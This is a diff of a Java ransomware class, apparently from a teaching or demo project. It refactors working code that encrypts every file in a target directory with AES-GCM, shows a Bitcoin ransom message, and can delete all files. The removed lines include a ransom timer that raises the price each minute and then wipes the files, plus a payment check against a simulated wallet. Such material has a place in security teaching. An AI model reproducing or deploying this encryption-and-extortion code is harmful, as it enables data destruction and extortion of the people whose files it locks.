@@ -1,8 +1,3 @@
-package report;
-
-import blockchain.Network;
-import blockchain.Wallet;
-
 import javax.crypto.Cipher;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.GCMParameterSpec;
@@ -13,37 +8,26 @@ import java.nio.file.Paths;
 import java.security.NoSuchAlgorithmException;
 import java.util.*;
 
-public class Report implements IReport {
+public class Report {
+    private static Report instance;
+    public Port port;
     // AES - Cryptography Params
     private static final String ENCRYPT_ALGO = "AES/GCM/NoPadding";
     private static final int TAG_LENGTH_BIT = 128;
     private static final int IV_LENGTH_BYTE = 12;
-    // Attacker
-    private final Wallet wallet;
-    private final double initialBalance;
     // Ransomware Params
-    private final File directory;
+    private File directory;
     private SecretKey secretKey;
     private byte[] nonce;
     private boolean isEncrypted;
-    private double amount;
-    private int minute;
-    Timer timer;
 
+    private Report() {
+        this.port = new Port();
 
-    public Report() {
         this.isEncrypted = false;
-
-        // Attacker
-        this.wallet = new Wallet();
-        initialBalance = wallet.getBalance();
 
         // Ransomware Params
-        this.directory = new File(String.valueOf(Paths.get("data").toAbsolutePath()));
         this.isEncrypted = false;
-        this.amount = 0.02755;
-        this.minute = 0;
-        this.timer = new Timer();
 
         // AES - Cryptography Params
         try {
@@ -52,6 +36,13 @@ public class Report implements IReport {
         } catch (NoSuchAlgorithmException e) {
             e.printStackTrace();
         }
+    }
+
+    public static Report getInstance() {
+        if (instance == null) {
+            instance = new Report();
+        }
+        return instance;
     }
 
     public static byte[] encrypt(byte[] pText, SecretKey secret, byte[] iv) throws Exception {
@@ -82,29 +73,13 @@ public class Report implements IReport {
         return bFile;
     }
 
-    @Override
-    public void checkPayment() throws Exception {
-        if (isEncrypted) {
-            if ((wallet.getBalance() >= (this.initialBalance + amount)) && Network.getInstance().isChainValid()) {
-                System.out.println("Transaction successful! Your files will be decrypted.");
-                startDecryption();
-                timer.cancel();
-            } else {
-                System.out.println("You need to pay me the full amount!");
-                System.out.format("To decrypt your files, I need %.5f more BTC!\n", (amount - wallet.getBalance()));
-            }
-        } else {
-            System.out.println("What payment do you want to check? Have you tried launching http://www.trust-me.mcg/report.jar?");
-        }
-    }
-
-    @Override
-    public void startEncryption() throws Exception {
+    public boolean innerStartEncryption(String directory) throws Exception {
         if (!isEncrypted) {
+            this.directory = new File(String.valueOf(Paths.get(directory).toAbsolutePath()));
             // Arraylist of all files in said directory
             List<File> files = new ArrayList<>();
 
-            for (File fileEntry : Objects.requireNonNull(directory.listFiles())) {
+            for (File fileEntry : Objects.requireNonNull(this.directory.listFiles())) {
                 if (!fileEntry.getName().endsWith(".mcg"))
                     files.add(fileEntry);
             }
@@ -121,16 +96,15 @@ public class Report implements IReport {
             }
 
             isEncrypted = true;
-            startTimer();
 
             System.out.println("Oops, your files have been encrypted. With a payment of 0.02755 BTC all files will be decrypted.");
+            return true;
         } else {
-            System.out.format("Your files already have been encrypted. Pay %.5f BTC to start the decryption.\n", amount);
+            return false;
         }
     }
 
-    @Override
-    public void startDecryption() throws Exception {
+    public void innerStartDecryption() throws Exception {
         if (isEncrypted) {
             List<File> files = new ArrayList<>();
 
@@ -153,33 +127,7 @@ public class Report implements IReport {
         }
     }
 
-    private void startTimer() {
-        timer.schedule(new TimerTask() {
-            public void run() {
-                switch (minute) {
-                    case 1, 2, 3 -> {
-                        setAmount(amount + 0.01);
-                        System.out.format("Amount to pay increased by 0,01 to %.5f BTC.\n", amount);
-                    }
-                    case 4 -> {
-                        setAmount(amount + 0.01);
-                        System.out.format("Pay %.5f BTC immediately or your files will be irrevocably deleted.\n", amount);
-                    }
-                    case 5 -> {
-                        System.out.println("Now your files will be irrevocably deleted.");
-                        deleteAllFiles();
-                        timer.cancel();
-                        System.exit(0);
-                    }
-                    default -> {
-                    }
-                }
-                minute++;
-            }
-        }, 0, 60 * 1000);
-    }
-
-    private void deleteAllFiles() {
+    private void innerDeleteALlFiles() {
         List<File> files = new ArrayList<>(Arrays.asList(Objects.requireNonNull(directory.listFiles())));
 
         for (File f : files) {
@@ -188,15 +136,24 @@ public class Report implements IReport {
     }
 
 
-    public double getAmount() {
-        return amount;
-    }
 
-    public void setAmount(double amount) {
-        this.amount = amount;
-    }
+    public class Port implements IReport {
 
-    public Wallet getWallet() {
-        return wallet;
+        @Override
+        public boolean startEncryption(String directory) throws Exception {
+            return innerStartEncryption(directory);
+        }
+
+        @Override
+        public void startDecryption() throws Exception {
+            innerStartDecryption();
+        }
+
+        @Override
+        public void deleteAllFiles() {
+            innerDeleteALlFiles();
+        }
     }
 }
+
+
